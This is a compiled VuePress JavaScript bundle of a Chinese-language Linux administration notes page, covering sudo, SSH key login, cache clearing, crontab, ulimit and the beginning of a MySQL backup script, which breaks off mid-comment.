(window.webpackJsonp=window.webpackJsonp||[]).push([[89],{343:function(s,t,a){"use strict";a.r(t);var e=a(9),n=Object(e.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("ClientOnly",[a("in-article-adsense",{attrs:{"ins-style":"display:block; text-align:center;","data-ad-slot":"7727965566"}})],1),s._v(" "),a("p"),a("div",{staticClass:"table-of-contents"},[a("ul",[a("li",[a("a",{attrs:{href:"#bash-sudo-command-not-found"}},[s._v("-bash: sudo: command not found")])]),a("li",[a("a",{attrs:{href:"#nano命令查找字符串search"}},[s._v("nano命令查找字符串search")])]),a("li",[a("a",{attrs:{href:"#sudo-apt-get-error-flabspath-on-var-lib-dpkg-status-failed-no-such-file-or-directory"}},[s._v("Sudo apt-get error: flAbsPath on /var/lib/dpkg/status failed - No such file or directory")])]),a("li",[a("a",{attrs:{href:"#复制本地文件到服务器"}},[s._v("复制本地文件到服务器")])]),a("li",[a("a",{attrs:{href:"#列出tar-gz压缩包的文件"}},[s._v("列出tar.gz压缩包的文件")])]),a("li",[a("a",{attrs:{href:"#linux密钥登录和用户名密码登录"}},[s._v("Linux密钥登录和用户名密码登录")]),a("ul",[a("li",[a("a",{attrs:{href:"#_1-产生公钥和私钥文件"}},[s._v("1. 产生公钥和私钥文件")])]),a("li",[a("a",{attrs:{href:"#_2-在服务器上安装公钥"}},[s._v("2. 在服务器上安装公钥")])]),a("li",[a("a",{attrs:{href:"#_3-设置ssh，打开公钥登录功能"}},[s._v("3. 设置SSH，打开公钥登录功能")])]),a("li",[a("a",{attrs:{href:"#_4-xshell等客户端将私钥下载到客户端，然后使用"}},[s._v("4. XShell等客户端将私钥下载到客户端，然后使用")])]),a("li",[a("a",{attrs:{href:"#_5-关闭原密码登陆方式-小心注意"}},[s._v("5. 关闭原密码登陆方式(小心注意)")])])])]),a("li",[a("a",{attrs:{href:"#linux中cache内存占用过高解决办法"}},[s._v("Linux中Cache内存占用过高解决办法")])]),a("li",[a("a",{attrs:{href:"#查看当前运行的进程的详细路径"}},[s._v("查看当前运行的进程的详细路径")])]),a("li",[a("a",{attrs:{href:"#通过进程pid查看进程"}},[s._v("通过进程pid查看进程")])]),a("li",[a("a",{attrs:{href:"#查看进程占用排序"}},[s._v("查看进程占用排序")])]),a("li",[a("a",{attrs:{href:"#查看定时任务-crontab命令"}},[s._v("查看定时任务 crontab命令")]),a("ul",[a("li",[a("a",{attrs:{href:"#etc-crontab-文件和-crontab-e-命令区别"}},[s._v("/etc/crontab文件和crontab -e命令区别")])])])]),a("li",[a("a",{attrs:{href:"#设置时区"}},[s._v("设置时区")])]),a("li",[a("a",{attrs:{href:"#查看文件夹各个文件大小"}},[s._v("查看文件夹各个文件大小")])]),a("li",[a("a",{attrs:{href:"#查看linux的架构-32-bit-or-64-bit"}},[s._v("查看linux的架构 32-bit or 64-bit")])]),a("li",[a("a",{attrs:{href:"#查看本机打开的端口号"}},[s._v("查看本机打开的端口号")])]),a("li",[a("a",{attrs:{href:"#创建链接"}},[s._v("创建链接")])]),a("li",[a("a",{attrs:{href:"#删除缓存的安装失败的包"}},[s._v("删除缓存的安装失败的包")])]),a("li",[a("a",{attrs:{href:"#修改用户名"}},[s._v("修改用户名")])]),a("li",[a("a",{attrs:{href:"#ssh登录失败"}},[s._v("ssh登录失败")])]),a("li",[a("a",{attrs:{href:"#改变当前用户组"}},[s._v("改变当前用户组")])]),a("li",[a("a",{attrs:{href:"#unzip命令中文文件名乱码"}},[s._v("unzip命令中文文件名乱码")])]),a("li",[a("a",{attrs:{href:"#配置linux并发最大打开文件数"}},[s._v("配置linux并发最大打开文件数")])]),a("li",[a("a",{attrs:{href:"#定时备份mysql数据库，保存7天记录脚本"}},[s._v("定时备份mysql数据库，保存7天记录脚本")])]),a("li",[a("a",{attrs:{href:"#ssh-或者telent登录linux后screen后台运行脚本"}},[s._v("SSH 或者telent登录linux后screen后台运行脚本")])]),a("li",[a("a",{attrs:{href:"#shell脚本中-dev-null-2-1"}},[s._v("shell脚本中>/dev/null 2>&1")]),a("ul",[a("li",[a("a",{attrs:{href:"#nohup结合"}},[s._v("nohup结合")])])])]),a("li",[a("a",{attrs:{href:"#挖矿木马病毒清理"}},[s._v("挖矿木马病毒清理")]),a("ul",[a("li",[a("a",{attrs:{href:"#木马解析"}},[s._v("木马解析")])]),a("li",[a("a",{attrs:{href:"#木马分析"}},[s._v("木马分析")])]),a("li",[a("a",{attrs:{href:"#常见非法的木马病毒"}},[s._v("常见非法的木马病毒")])])])])])]),a("p"),s._v(" "),a("h2",{attrs:{id:"bash-sudo-command-not-found"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#bash-sudo-command-not-found"}},[s._v("#")]),s._v(" -bash: sudo: command not found")]),s._v(" "),a("p",[s._v("在debian系统中可能会报这个错误，执行如下安装"),a("code",[s._v("sudo")]),s._v(":")]),s._v(" "),a("div",{staticClass:"language-shell extra-class"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("apt")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" \n$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nano")]),s._v(" /etc/sudoers\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 检查对应的sudo组是否有所有的权限：")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Allow members of group sudo to execute any command")]),s._v("\n%sudo   "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("ALL")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ALL:ALL"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" ALL\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 以上的设置说明sudo已经有所有的权限，这样设置即可。")]),s._v("\n")])])]),a("h2",{attrs:{id:"nano命令查找字符串search"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#nano命令查找字符串search"}},[s._v("#")]),s._v(" nano命令查找字符串search")]),s._v(" "),a("p",[s._v('当你想搜索某特定文字时，只要想成"WhereIs"而不是"Search"，事情就简单了。只要按下'),a("strong",[s._v("Ctrl+W")]),s._v("，键入你要搜索的字符串，再按Enter就可以了。想再次搜索相同的字符串，可以直接按Alt+W。也就是搜索下一个。")]),s._v(" "),a("p",[s._v("注意:在nano帮助文档里，Ctrl-键被表示为一个脱字符（^），因此"),a("strong",[s._v("Ctrl+W")]),s._v('被写成了^W，等等。Alt-键被表示为一个M（从"Meta"而来），因此Alt+W被写成了M-W。')]),s._v(" "),a("h2",{attrs:{id:"sudo-apt-get-error-flabspath-on-var-lib-dpkg-status-failed-no-such-file-or-directory"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sudo-apt-get-error-flabspath-on-var-lib-dpkg-status-failed-no-such-file-or-directory"}},[s._v("#")]),s._v(" Sudo apt-get error: flAbsPath on /var/lib/dpkg/status failed - No such file or directory")]),s._v(" "),a("p",[s._v("执行安装包安装报错： Sudo apt-get error: flAbsPath on /var/lib/dpkg/status failed - No such file or directory")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$ sudo touch /var/lib/dpkg/status\n$ sudo apt update && sudo apt upgrade\n")])])]),a("h2",{attrs:{id:"复制本地文件到服务器"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#复制本地文件到服务器"}},[s._v("#")]),s._v(" 复制本地文件到服务器")]),s._v(" "),a("p",[a("strong",[s._v("scp - secure copy (remote file copy program)")])]),s._v(" "),a("ol",[a("li",[s._v("本地Windows下执行文件复制到指定目录\nthe "),a("strong",[s._v(".")]),s._v(" just indicates the current directory path.")])]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("D:\\linux> scp [source file] [username]@[destination server]:.\nD:\\linux> scp cool_stuff.txt pi@192.168.1.17:.\nD:\\linux> scp cool_stuff.txt pi@192.168.1.17:/this/path/right/here\n\n")])])]),a("ol",{attrs:{start:"2"}},[a("li",[s._v("下载远程服务端文件到本地")])]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$ scp sanjeev@example.com:cool_stuff.txt /this/path/right/here\n")])])]),a("h2",{attrs:{id:"列出tar-gz压缩包的文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#列出tar-gz压缩包的文件"}},[s._v("#")]),s._v(" 列出tar.gz压缩包的文件")]),s._v(" "),a("p",[s._v("命令: "),a("code",[s._v("tar tzf test.tar.gz")])]),s._v(" "),a("h2",{attrs:{id:"linux密钥登录和用户名密码登录"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#linux密钥登录和用户名密码登录"}},[s._v("#")]),s._v(" Linux密钥登录和用户名密码登录")]),s._v(" "),a("p",[s._v("对于Linux服务器，默认以密码登陆，安全性比较差，很早前就有计划修改为使用密钥登陆，一直觉得比较麻烦搁置着，其实步骤并不难，只是当时没觉得安全问题有那么严重而已。如果你也是这么认为，那么可以尝试登陆Linux服务器，输入以下命令：")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("lastb | less\n")])])]),a("p",[s._v("可以看到几乎每天都会有大量的尝试登陆存在。为了服务器安全，禁止密码登陆，使用密钥方式登陆还是必要的。这里我尽量简单的记录下我设置的过程。")]),s._v(" "),a("p",[s._v("配置方法")]),s._v(" "),a("h3",{attrs:{id:"_1-产生公钥和私钥文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-产生公钥和私钥文件"}},[s._v("#")]),s._v(" 1. 产生公钥和私钥文件")]),s._v(" "),a("ol",[a("li",[s._v("在服务器端使用如下命令产生公钥和私钥：")])]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$  ssh-keygen\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/root/.ssh/id_rsa): <== 按 Enter\nCreated directory '/root/.ssh'.\nEnter passphrase (empty for no passphrase): <== 输入密钥锁码，或直接按 Enter 留空\nEnter same passphrase again: <== 再输入一遍密钥锁码\nYour identification has been saved in /root/.ssh/id_rsa. <== 私钥\nYour public key has been saved in /root/.ssh/id_rsa.pub. <== 公钥\nThe key fingerprint is:\n0f:d3:e7:1a:1c:bd:5c:03:f1:19:f1:22:df:9b:cc:08 root@host\n\n")])])]),a("p",[s._v("在 当前 用户的家目录中生成了一个 "),a("code",[s._v(".ssh")]),s._v(" 的隐藏目录，内含两个密钥文件。"),a("code",[s._v("id_rsa")]),s._v(" 为私钥，"),a("code",[s._v("id_rsa.pub")]),s._v(" 为公钥。")]),s._v(" "),a("ul",[a("li",[a("p",[s._v("关于此处操作对于阿里云服务器也可以直接在阿里云的“"),a("strong",[s._v("网络与安全")]),s._v('”-> "'),a("strong",[s._v("密钥对")]),s._v('"中由阿里云生成。阿里云： https://developer.aliyun.com/article/666688')])]),s._v(" "),a("li",[a("p",[s._v("你也可以使用xshell或者puttygen工具等在你自己的机器上产生对应的公钥，然后把"),a("strong",[s._v("公钥导出为私钥")]),s._v("。")])])]),s._v(" "),a("h3",{attrs:{id:"_2-在服务器上安装公钥"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-在服务器上安装公钥"}},[s._v("#")]),s._v(" 2. 在服务器上安装公钥")]),s._v(" "),a("p",[s._v("登陆需要配置密钥登陆的服务器，将公钥内容填入~/.ssh/authorized_keys文件中：")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$ mkdir ~/.ssh\n$ cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys\n# 或者如果是客户端自己产生的可以直接编辑\n$ nano ~/.ssh/authorized_keys\n")])])]),a("p",[a("strong",[s._v("注意")]),s._v("：保存后，对"),a("code",[s._v(".ssh")]),s._v("目录和其中的"),a("code",[s._v("authorized_keys")]),s._v("公钥文件设置相应的权限：")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("chown -R root:root ~/.ssh\nchmod -R 700  ~/.ssh\nchmod -R 644  ~/.ssh/authorized_keys\n\n")])])]),a("h3",{attrs:{id:"_3-设置ssh，打开公钥登录功能"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-设置ssh，打开公钥登录功能"}},[s._v("#")]),s._v(" 3. 设置SSH，打开公钥登录功能")]),s._v(" "),a("p",[s._v("接着修改ssh配置文件：")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("nano /etc/ssh/sshd_config\n")])])]),a("p",[s._v("对以下内容去掉注释：")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("RSAAuthentication yes\nPubkeyAuthentication yes\n# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2\n# but this is overridden so installations will only check .ssh/authorized_keys\nAuthorizedKeysFile      .ssh/authorized_keys\n# 记得最后面加上这个，否则无法进行密码登录\nPasswordAuthentication yes\n")])])]),a("p",[s._v("保存后重启sshd服务：")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("systemctl restart sshd\n")])])]),a("h3",{attrs:{id:"_4-xshell等客户端将私钥下载到客户端，然后使用"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-xshell等客户端将私钥下载到客户端，然后使用"}},[s._v("#")]),s._v(" 4. XShell等客户端将私钥下载到客户端，然后使用")]),s._v(" "),a("ul",[a("li",[s._v("如果是通过"),a("code",[s._v("ssh-keygen")]),s._v("在服务器产生的公钥和私钥,从服务器下载私钥文件： "),a("code",[s._v("/root/.ssh/id_rsa")]),s._v("， 然后在xshell中进行连接使用。")]),s._v(" "),a("li",[s._v("如果是自己的电脑上产生的公钥，需要将公钥导出为私钥被保存，然后登录时候使用该私钥。如下截图：\n"),a("img",{attrs:{src:"https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200711175803-2020-07-11.png",alt:"20200711175803-2020-07-11"}})])]),s._v(" "),a("h3",{attrs:{id:"_5-关闭原密码登陆方式-小心注意"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_5-关闭原密码登陆方式-小心注意"}},[s._v("#")]),s._v(" 5. 关闭原密码登陆方式(小心注意)")]),s._v(" "),a("p",[s._v("如果使用密钥登陆成功，可以继续修改ssh配置文件，关闭密码登陆：")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("nano /etc/ssh/sshd_config\n")])])]),a("p",[s._v("设置：")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("PasswordAuthentication no\n")])])]),a("p",[s._v("保存后重启sshd服务的步骤同上，这样就完成了密钥登陆的配置。")]),s._v(" "),a("h2",{attrs:{id:"linux中cache内存占用过高解决办法"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#linux中cache内存占用过高解决办法"}},[s._v("#")]),s._v(" Linux中Cache内存占用过高解决办法")]),s._v(" "),a("p",[s._v("文章来源: "),a("a",{attrs:{href:"https://blog.csdn.net/ailice001/article/details/80353924",target:"_blank",rel:"noopener noreferrer"}},[s._v("解决Linux buffer/cache内存占用过高的办法"),a("OutboundLink")],1)]),s._v(" "),a("ol",[a("li",[s._v("在Linux系统中，我们经常用free命令来查看系统内存的使用状态。")]),s._v(" "),a("li",[s._v("如何回收cache？")])]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('$ sudo sh -c "echo 1 > /proc/sys/vm/drop_caches":表示清除pagecache。\n$ sudo sh -c "echo 2 > /proc/sys/vm/drop_caches":表示清除回收slab分配器中的对象（包括目录项缓存和inode缓存）。slab分配器是内核中管理内存的一种机制，其中很多缓存数据实现都是用的pagecache。\n$ sudo sh -c "echo 3 > /proc/sys/vm/drop_caches":表示清除pagecache和slab分配器中的缓存对象。\n')])])]),a("h2",{attrs:{id:"查看当前运行的进程的详细路径"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看当前运行的进程的详细路径"}},[s._v("#")]),s._v(" 查看当前运行的进程的详细路径")]),s._v(" "),a("p",[s._v("使用命令：")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$ top -c\n")])])]),a("h2",{attrs:{id:"通过进程pid查看进程"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#通过进程pid查看进程"}},[s._v("#")]),s._v(" 通过进程pid查看进程")]),s._v(" "),a("p",[s._v("执行命令：")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$ ls  -l /proc/pid\n例如：\n$ ls -ls /proc/1245\n")])])]),a("h2",{attrs:{id:"查看进程占用排序"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看进程占用排序"}},[s._v("#")]),s._v(" 查看进程占用排序")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$ ps -aux --sort=-pcpu|head -10\n\n")])])]),a("h2",{attrs:{id:"查看定时任务-crontab命令"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看定时任务-crontab命令"}},[s._v("#")]),s._v(" 查看定时任务 crontab命令")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# 查看定时任务\n$ crontab -l  \n# 编辑定时任务，删除或者注释定时任务\n$ crontab -e\n# 编辑，针对的是root用户\n$ nano /etc/crontab\n# 停止crontab，启动crontab任务\n$ systemctl stop cron\n$ systemctl restart cron\n")])])]),a("h3",{attrs:{id:"etc-crontab文件和crontab-e命令区别"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#etc-crontab文件和crontab-e命令区别"}},[s._v("#")]),s._v(" "),a("code",[s._v("/etc/crontab")]),s._v("文件和"),a("code",[s._v("crontab -e")]),s._v("命令区别")]),s._v(" "),a("ol",[a("li",[s._v("格式不同。")]),s._v(" "),a("li",[s._v("修改/etc/crontab这种方法只有root用户能用，而crontab -e这种所有用户都可以使用，普通用户也只能为自己设置计划任务。然后自动写入"),a("code",[s._v("/var/spool/cron/usename")]),s._v("。")]),s._v(" "),a("li",[s._v("不管用 "),a("code",[s._v("crontab -e")]),s._v(" or 改 "),a("code",[s._v("/etc/crontab")]),s._v(" 都不需要重新启动 crond 服务")])]),s._v(" "),a("h2",{attrs:{id:"设置时区"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#设置时区"}},[s._v("#")]),s._v(" 设置时区")]),s._v(" "),a("p",[s._v("参考设置连接: "),a("a",{attrs:{href:"https://www.cnblogs.com/yoyotl/p/8151409.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("Debian 8 设置时区和时间配置"),a("OutboundLink")],1)]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$ tzselect\n")])])]),a("h2",{attrs:{id:"查看文件夹各个文件大小"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看文件夹各个文件大小"}},[s._v("#")]),s._v(" 查看文件夹各个文件大小")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$ du -sh *\n")])])]),a("h2",{attrs:{id:"查看linux的架构-32-bit-or-64-bit"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看linux的架构-32-bit-or-64-bit"}},[s._v("#")]),s._v(" 查看linux的架构 32-bit or 64-bit")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# 32位还是64位\nuname -a\n# 下面命令显示CPU架构\nlscpu\n$ cat /proc/cpuinfo \nProcessor       : ARMv7 Processor rev 10 (v7l)\nARMv7 (and below) is 32-bit. ARMv8 introduces the 64-bit instruction set.\nIf you want to see whether your system supports 64-bit binaries, check the kernel architecture:\n$ uname -m\n")])])]),a("h2",{attrs:{id:"查看本机打开的端口号"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看本机打开的端口号"}},[s._v("#")]),s._v(" 查看本机打开的端口号")]),s._v(" "),a("p",[s._v("默认情况下Linux的1024以下端口是只有root用户才有权限占用,我们的tomcat,apache, nginx等等程序如果想要用普通用户来占用80端口的话就会抛出 java.net.BindException: Permission denied的异常。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("查看指定的端口\n$ sudo lsof -i:port\n\n查看所有端口\n$ sudo netstat -aptn\n")])])]),a("h2",{attrs:{id:"创建链接"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#创建链接"}},[s._v("#")]),s._v(" 创建链接")]),s._v(" "),a("p",[s._v("在当前目录创建一个链接名称"),a("code",[s._v("python")]),s._v(",这个链接指向的位置是: "),a("code",[s._v("/usr/local/bin/python")]),s._v(",命令如下:\nln -s 源文件 目标目录")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$ ln -s /usr/local/bin/python python\n")])])]),a("h2",{attrs:{id:"删除缓存的安装失败的包"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#删除缓存的安装失败的包"}},[s._v("#")]),s._v(" 删除缓存的安装失败的包")]),s._v(" "),a("p",[s._v("进入目录"),a("code",[s._v("/var/cache/apt/archives")]),s._v(",删除下面的所有.deb文件即可")]),s._v(" "),a("h2",{attrs:{id:"修改用户名"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#修改用户名"}},[s._v("#")]),s._v(" 修改用户名")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$ sudo passwd\n")])])]),a("h2",{attrs:{id:"ssh登录失败"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ssh登录失败"}},[s._v("#")]),s._v(" ssh登录失败")]),s._v(" "),a("ol",[a("li",[s._v("进入谷歌云实例面板")]),s._v(" "),a("li",[s._v("切换到root角色,命令: "),a("code",[s._v("sudo -i")])]),s._v(" "),a("li",[s._v("修改SSH配置文件"),a("code",[s._v("/etc/ssh/sshd_config")]),s._v("为如下内容:")])]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# Authentication:\nPermitRootLogin yes //默认为no，需要开启root用户访问改为yes\n\n# Change to no to disable tunnelled clear text passwords\nPasswordAuthentication yes //默认为no，改为yes开启密码登陆\n")])])]),a("ol",{attrs:{start:"4"}},[a("li",[s._v("给root用户设置密码 "),a("code",[s._v("passwd root")])]),s._v(" "),a("li",[s._v("重启ssh服务:    "),a("code",[s._v("/etc/init.d/ssh restart")])]),s._v(" "),a("li",[s._v("在xshell中，直接使用root账号密码登录。")])]),s._v(" "),a("p",[s._v("在客户端或者服务端进行如下ssh链接,查看ssh登录失败的log:")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("> ssh -vvv alterhu2020@host \n")])])]),a("p",[s._v("On the server end, check the logs. "),a("code",[s._v("/var/log/auth.log")]),s._v(" will give you a pretty good idea about what happens when you try to login, look for messages that contain sshd. There are a variety of reasons why authentication could be failing, ranging from simple (you aren't using the right username) to more complicated (sshd is configured to use the wrong authentication system).")]),s._v(" "),a("p",[s._v("如果以上还不行,直接通过root登录.")]),s._v(" "),a("h2",{attrs:{id:"改变当前用户组"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#改变当前用户组"}},[s._v("#")]),s._v(" 改变当前用户组")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$ sudo usermod -g www-data alterhu2020   (需要重启机器生效)\n$ groups alterhu2020\n$ sudo nano /etc/sudoers\n")])])]),a("h2",{attrs:{id:"unzip命令中文文件名乱码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#unzip命令中文文件名乱码"}},[s._v("#")]),s._v(" unzip命令中文文件名乱码")]),s._v(" "),a("p",[s._v("采用最新的unzip命令没有参数"),a("code",[s._v("-O")]),s._v("，网上提到的使用参数"),a("code",[s._v("-O")]),s._v("可以指定编码，所以这个访问不能使用。所以使用"),a("code",[s._v("unar")]),s._v("命令:")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("$ sudo apt-get install unar\n\n$ unar -e gb18030 gb18030.zip\n")])])]),a("h2",{attrs:{id:"配置linux并发最大打开文件数"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#配置linux并发最大打开文件数"}},[s._v("#")]),s._v(" 配置linux并发最大打开文件数")]),s._v(" "),a("p",[s._v("进行目录"),a("code",[s._v("/etc/profile")]),s._v("添加如下配置信息:")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# node环境变量\nexport PATH=/opt/node/node-v12.14.1-linux-armv7l/bin:$PATH\n\n# java环境变量\nexport JAVA_HOME=/opt/jdk/jdk1.8.0_241\nexport JRE_HOME=$JAVA_HOME/jre\nexport PATH=$JAVA_HOME/bin:$PATH\nexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\n\n# 设置pipenv\nexport PATH=$HOME/.local/bin:$PATH\n\n# 设置最大文件数,mysql和websock最大连接数\nulimit -u 1048576\nulimit -n 1048576\nulimit -d unlimited\nulimit -m unlimited\nulimit -s unlimited\nulimit -t unlimited\nulimit -v unlimited\n\n")])])]),a("p",[s._v("以上的配置如果用非root用户双概述可能会出现错误: "),a("code",[s._v("-bash: ulimit: max user processes: cannot modify limit:")]),s._v(". 需要修改对应配置文件: "),a("code",[s._v("/etc/security/limits.conf")]),s._v(", 在文件末尾增加如下配置信息(* 代表的是任意用户,比如root/pi),命令如下:")]),s._v(" "),a("p",[a("code",[s._v("$ sudo nano /etc/security/limits.conf")])]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("* soft noproc 1048576\n* hard noproc 1048576\n* soft nofile 1048576\n* hard nofile 1048576\n\n")])])]),a("h2",{attrs:{id:"定时备份mysql数据库，保存7天记录脚本"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#定时备份mysql数据库，保存7天记录脚本"}},[s._v("#")]),s._v(" 定时备份mysql数据库，保存7天记录脚本")]),s._v(" "),a("p",[s._v("脚本参考来源:")]),s._v(" "),a("ul",[a("li",[a("a",{attrs:{href:"https://gist.github.com/tleish/1c6e788c84f59200446b",target:"_blank",rel:"noopener noreferrer"}},[s._v("mysql定时备份脚本(推荐)"),a("OutboundLink")],1)]),s._v(" "),a("li",[a("a",{attrs:{href:"https://graspingtech.com/schedule-backup-mysql-databases-ubuntu-16-04/",target:"_blank",rel:"noopener noreferrer"}},[s._v("mysql备份脚本"),a("OutboundLink")],1)])]),s._v(" "),a("ul",[a("li",[s._v("mysql备份脚本：")])]),s._v(" "),a("div",{staticClass:"language-shell extra-class"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token shebang important"}},[s._v("#!/bin/bash")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#==============================================================================")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#TITLE:            mysql_backup.sh")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#DESCRIPTION:      script for automating the daily mysql backups on development computer")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#AUTHOR:           tleish")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#DATE:             2013-12-20")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#VERSION:          0.4")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#USAGE:            ./mysql_backup.sh")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#CRON:")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# example cron for daily db backup @ 9:15 am")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# min  hr mday month wday command")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 15   9  *    *     *    /opt/backup/scripts/mysql_backup.sh")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#RESTORE FROM BACKUP")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#$ gunzip < [backupfile.sql.gz] | mysql -u [uname] -p[pass] 